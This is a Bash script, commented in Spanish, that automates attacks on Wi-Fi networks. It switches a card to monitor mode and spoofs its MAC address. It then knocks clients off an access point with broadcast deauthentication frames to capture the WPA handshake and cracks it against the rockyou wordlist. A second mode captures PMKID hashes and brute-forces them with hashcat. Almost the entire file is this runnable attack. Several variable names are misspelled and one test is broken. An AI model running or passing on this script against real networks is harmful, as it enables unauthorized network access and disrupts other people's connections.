                                                                                                                                                                                                                                                                                                                                                          wifipwn.sh                                                                                                                                                                                                                                                                                                                                                                                                                                       
#!/bin/bash

# Author: Pr0!pwn - A boton Gordo y pa' dentro

#Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

#Declarando una variable de entorno para que no funcione el modo intalador interfaz grafica, solo por consola, para poder instalar las herramientas nosotros desde el script

export DEBIAN_FRONTEND=noninteractive

# Cogiendo el Ctrl para poder parar la ejecucion del programa
trap ctrl_c INT

function ctrl_c(){
        echo -e "\n${yellowColour}[*]${endColour}${greyColour}Saliendo${endColour}"
        tput cnorm; airmon-ng stop ${networkCard}mon > /dev/null 2>&1
        rm Captura* 2>/dev/null
        exit 0
}

#Panel de Ayuda para referenciar como el usuario tiene que usar este script correctamente
function helpPanel(){
        echo -e "\n${yellowColour}[*] Uso: ${endColour}${greyColour}./wifipwn.sh${endColour}"
        echo -e "\t${purpleColour}a)${endColour}${yellowColour} Modo de Ataque${endColour}\n"
        echo -e "\t${redColour}[Handshake]${endColour}\n"
        echo -e "\t${redColour}[PKMID]${redColour}\n "
        echo -e "\t${purpleColour}n)${endColour}${yellowColour} Tarjeta de Red${endColour}\n"
        echo -e "\t${blueColour}1)${endColour}${greyColour} Si es esta, escribe: ${endColour}${greenColour}wlan0${endColour}\n"
        echo -e "\t${blueColour}2)${endColour}${greyColour} Si es esta, escribe: ${endColour}${greenColour}wlan1${endColour}\n"
        echo -e "\t${purpleColour}h)${endColour}${yellowColour}Mostrar el Panel de Ayuda${endColour}\n"
        exit 0
}

#Creamos las dependencia funcion para chequear si tenemos los programas instalados necesarios para correr este script que estamos haciendo [ aircrack-n , macchanger]
function dependencies(){
        tput civis
        clear

        dependencies=(aircrack-ng macchanger)
        echo -e "\n${yellowColour}[*]${yellowColour}${greyColour} Comprobando Programas Necesarios${endColour}"
        sleep 2

        for program in "${dependencies[@]}";do
                echo -ne "\n${yellowColour}[*]${endColour}${blueColour} Herramienta${endColour}${redColour}$program${endColour}${blueColour}...${endColour}"

                test -f /usr/bin/$program

                if [ "$(echo $?)" == "0" ]; then
                        echo -e "${greenColour}(V)${endColour}"
                else
                        echo -e "${redColour}(X)${endColour}"
                        echo -e "${yellowColour}Instalando Herramientas ${endColour}${greyColour}$program${endColour}${yellowColour}...${endColour}"
                        apt-get install $program -y
                fi; sleep 1
        done
}

#Funcion que defimos para empezar a lanzar el Ataque primer modo HANDSHAKE
# Indicamos que empezamos poniendo la targeta de red en modo monitor, cambiamos la macc y posteriormente empezamos el escaneo con airodump-ng
function startAttack(){

                clear
                echo -e "\t${redColour}Empezando con el ataque${endColour}"
                echo -e "\n${yellowColour}Poniendo la Targeta de Red en Modo Monitor ${endColour}"
                echo -e "\n${yellowColour}Cambiando la Mac con Macchanger${endColour}"
                echo -e "\n${yellowColour}La Targeta de Red Elegida es:${endColour}${blueColour}${networkCard}${endColour}"
                airmon-ng start $networkCard > /dev/null 2>&1
                ifconfig ${networkCard}mon down && macchanger -a ${networdCard}mon > /dev/null 2>&1
                ifconfig ${networkCard}mon up;  killall dhclient wpa_supplicant 2>/dev/null
                echo -e "\n${yellowColour}[*]${endColour}${greenColour} Nueva Mac:${endColour}${blueColour}$(macchanger -s ${networkCard}mon | grep -i current | xargs | cut -d ' ' -f '3-100')${endColour}"


        if [ "$(echo $attack_mode)" == "Handshake" ]; then
                clear
                echo -e "\t${redColour}Empezando con el ataque:${endColour}${greenColour} $attack_mode ${endColour}"
#               echo -e "\n${yellowColour}Poniendo la Targeta de Red en Modo Monitor ${endColour}"
#               echo -e "\n${yellowColour}Cambiando la Mac con Macchanger${endColour}"
#               echo -e "\n${yellowColour}La Targeta de Red Elegida es:${endColour}${blueColour}${networkCard}${endColour}"
#               airmon-ng start $networkCard > /dev/null 2>&1
#               ifconfig ${networkCard}mon down && macchanger -a ${networdCard}mon > /dev/null 2>&1
#               ifconfig ${networkCard}mon up;  killall dhclient wpa_supplicant 2>/dev/null
#               echo -e "\n${yellowColour}[*]${endColour}${greenColour} Nueva Mac:${endColour}${blueColour}$(macchanger -s ${networkCard}mon | grep -i current | xargs | cut -d ' ' -f '3-100')${endColour}"

                xterm -hold -e "airodump-ng ${networkCard}mon" & #DEJAMOS EL PROCESO EN SEGUNDO PLANO
                airodump_xterm_PID=$! #ALMACENAMOS EL PID DEL PROCESSO PARA PODER MATARLO DESPUES
                echo -ne "\n${yellowColour}[*]${endColour}${greyColour}Nombre del punto de Acceso:${endColour}" && read apName
                echo -ne "\n${yellowColour}[*]${endColour}${greyColour}Canal del punto de Acceso:${endColour}" && read apChannel
#               echo -ne "\n${redColour}Diccionario: ${endColour}${greenColour}$Introduce la Ruta de Tu Diccionario:${endColour}" && read diccionario
                kill -9 $airodump_xterm_PID #Matamos la primera terminal de airodump-ng 
                wait $airodump_xterm_PID 2>/dev/null #errores fuera 

                xterm -hold -e "airodump-ng -c $apChannel -w Captura --essid $apName ${networkCard}mon" & #Ponemos airodump a la escucha por el ESSID $apName indicado y Canal $apChannel
                airodump_filter_xterm_PID=$! # Almacenamos otra vez el proceso filtrando por el PID
                sleep 5; xterm -hold -e "aireplay-ng -0 10 -e $apName -c FF:FF:FF:FF:FF:FF ${networkCard}mon" &
                aireplay_xterm_PID=$!

                sleep 10; kill -9 $aireplay_xterm_PID; wait $aireplay_xterm_PID 2>/dev/null

                sleep 10; kill -9 $airodump_filter_xterm_PID
                wait $airodump_filter_xterm_PID 2>/dev/null
                #Ahora teniendo el HANDSHAKE conseguido vamos a CRACKEAR los HANDSHAKES con AIRCRACK, la idea es que nos aparaezca en otra terminal de proceso en segundo plano por eso no almacenamos el PID para matar el proceso
                xterm -hold -e "aircrack-ng -w $(locate rockyou.txt| head -n 1) Captura-01.cap" &
#               xterm -hold -e "aircrack-ng -w $diccionario Captura-01.cap" & 2>/dev/null


        elif [ "$(echo $attack_mode)" == "PKMID" ]; then
                clear; echo -e "${redColour}[*]${endColour}${greyColour} Iniciando PKMID Attack .. .. .${endColour}\n"
                sleep 2;
                timeout 60 bash -c "hcxdumptool -i ${networkCard}mon --enable_status=1 -o Captura"
                echo -e "\n${yelowColour}[*]${endColour}${blueColour} Obteniendo Hashes . . .${endColour}\n"
                sleep 2
                hcxpcaptool -z myhashes Captura; rm Captura 2>/dev/null
                test -f myhashes

                if ["${echo $?}" == "0" ]; then
                        echo -e "\n${redColour}Iniciando la fuerza bruta con * HASHCAT *${endColour}\n"
                        sleep 2
                        hashcat -m 16800 $(locate rockyou.txt| head -n 1) myhashes -d 1 --force
                else
                        echo -e "\t${redColour}[!]${endColour}${yellowColour}No se han encontrado Hashes${endColour}"
                        sleep 2
                fi      


        else
                echo -e "\n${redColour} [*] Este Modo de Atacke no Existe [*]${redColour}\n"
        fi
}


# Main function
# Si el id no es 0 no eres Root, si eres 0; declaramos unas variable progresiva; mientras que cogas opciones (a) (n) (h) definimos argumentos; haz
if [ "$(id -u)" == "0" ]; then
        declare -i parameter_counter=0; while getopts "a:n:h:" arg; do 
                case $arg in
                        a) attack_mode=$OPTARG; let parameter_counter+=1 ;; #el $OPTARG sirve para recoger los $arg-gumentos recogidos a escoger por el user
                        n) networkCard=$OPTARG; let parameter_counter+=1 ;;
                        h) helpPanel ;;
                esac
        done
        if [ $parameter_counter -ne 2 ]; then
                helpPanel

        else
                dependencies
                startAttack
                tput cnorm; airmon-ng stop ${networkCard}mon > /dev/null 2>&1; #rm Captura* 2>/dev/null
        fi

else
        echo -e "\n${redColour}[*] No soy root${endColour}\n"
fi

